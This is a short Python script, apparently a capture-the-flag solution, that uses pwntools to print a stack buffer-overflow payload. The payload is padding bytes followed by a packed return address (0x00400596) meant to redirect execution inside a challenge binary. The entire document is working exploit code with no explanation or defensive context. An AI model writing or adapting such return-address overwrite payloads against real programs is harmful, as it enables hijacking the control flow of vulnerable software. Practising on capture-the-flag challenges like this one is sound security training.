from pwn import p64
print('A' * 0xF + 'a' * 0x8 + p64(0x00400596).decode('unicode_escape'))